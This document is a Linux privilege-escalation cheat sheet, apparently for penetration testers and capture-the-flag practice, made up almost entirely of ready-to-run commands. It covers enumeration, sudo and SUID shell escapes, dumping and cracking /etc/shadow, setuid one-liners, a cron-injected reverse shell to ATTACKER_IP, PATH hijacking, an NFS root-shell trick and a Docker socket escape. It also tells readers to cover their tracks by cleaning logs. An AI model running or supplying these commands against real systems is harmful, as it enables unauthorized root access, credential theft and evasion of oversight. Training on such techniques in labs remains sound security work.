## 1️⃣ System Enumeration

🔍 **Baseline Checks**

```bash
hostname               # Hostname
uname -a               # Kernel & architecture
cat /proc/version      # Kernel build
cat /etc/issue         # OS info
```

🔍 **User & Env**

```bash
id                     # User & groups
env                    # Env variables
history                # Command history
```

🔍 **Network**

```bash
ip a / ifconfig        # Interfaces
ip route / netstat -rn # Routes
ss -tulpan             # Open ports/services
```

🔍 **Permissions & Special Bits**

```bash
find / -perm -4000 -type f -ls 2>/dev/null  # SUID
find / -user root -perm -4000 -exec ls -ldb {} \; # SUID systemwide alt
getcap -r / 2>/dev/null                     # Capabilities
```

🔍 **Scheduled Jobs**

```bash
cat /etc/crontab
ls -la /etc/cron.*/*
crontab -l
```

🔍 **Writable Places**

```bash
find / -writable -type d 2>/dev/null
```

---

## 2️⃣ Automated Enumeration

Use to speed up, **never trust blindly** — validate by hand:
```bash
wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

---

## 3️⃣ Kernel Exploits

1. `uname -r` — get version
2. Search **CVE**, **searchsploit**, **Exploit-DB**
    ```bash
    searchsploit Linux Kernel <version>
    ```
3. Transfer exploit: `wget`, `scp`, `python3 -m http.server`
4. Compile & run:
    ```bash
    gcc exploit.c -o exploit && ./exploit
    ```
5. `whoami` → verify root

⚠️ **Danger:** Kernel exploits can crash a box — use only when safe.

---

## 4️⃣ Sudo Abuse

🔍 **List allowed commands:**

```bash
sudo -l
```

🔑 **GTFOBins Tricks**

- `find`:    
    ```bash
    sudo find . -exec /bin/sh \\; -quit
    ```
- `vim`:
    ```bash
    sudo vim -c ':!sh'
    ```
- `less`, `nano`: similar `:!bash` or `^R^X` tricks.

Always check [GTFOBins](https://gtfobins.github.io/).

---

## 5️⃣ SUID Binary Abuse

```bash
find / -perm -4000 -type f 2>/dev/null
```

Check unusual SUID binaries (`nmap`, `vim`, `find`):

```bash
nmap --interactive
!sh
```

Or dump shadow:

```bash
/usr/bin/base64 /etc/shadow > /tmp/shadow.b64
base64 -d /tmp/shadow.b64 > /tmp/shadow.txt

unshadow /etc/passwd /tmp/shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## 6️⃣ File Capabilities

Show files with capabilities:

```bash
getcap -r / 2>/dev/null
```

If `cap_setuid`:

```bash
python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'
```

Or use `perl` GTFOBin:

```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh\";'
```

---

## 7️⃣ Cron Job Abuse

Find writable cron scripts:

```bash
grep -R \"root\" /etc/cron* 2>/dev/null
```

If writable:

```bash
echo \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" >> /root/cronjob.sh
nc -lvnp 4444
```

---

## 8️⃣ PATH Hijacking

If a root process calls a binary using relative PATH:

```bash
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\\n/bin/bash' > /tmp/ls
chmod +x /tmp/ls
```

When root runs `ls` → you get root shell.

---

## 9️⃣ NFS `no_root_squash`

Check `/etc/exports`:

```bash
cat /etc/exports
```

If `no_root_squash` → mount:

```bash
mount -o rw ATTACKER_IP:/share /mnt
echo -e '#!/bin/bash\\n/bin/bash' > /mnt/rootshell
chmod +x /mnt/rootshell
chown root:root /mnt/rootshell
chmod 4755 /mnt/rootshell
```

Run on target:

```bash
./rootshell
```

---

## 🔟 Other Useful Vectors

✅ **Sticky Bit Misconfigs:**  
Check `/tmp`:

```bash
ls -ld /tmp
# Should be drwxrwxrwt
```

If `t` is missing, any user can delete others’ files.

✅ **Weak SSH Keys:**

```bash
find / -name id_rsa 2>/dev/null
```

Try recovered private keys with:

```bash
ssh -i id_rsa user@host
```

✅ **Docker Socket:**

```bash
ls -l /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

✅ **Kubernetes:**  
Check `/var/run/secrets/kubernetes.io/`.

✅ **Misconfigured Kernel Modules:**  
Look for `insmod` or custom modules with write access.

---

## ✔️ Key Takeaways

1️⃣ **Enum like crazy** — every privesc starts there.  
2️⃣ **Cross-check auto tools** by hand.  
3️⃣ **Use least-destructive first** (sudo, SUID, cron > kernel exploit).  
4️⃣ **Cover your tracks** — clean dropped files/logs.  
5️⃣ **Document everything** for your report.  
6️⃣ **Train constantly** — practice on THM, VulnHub, HackTheBox.

---

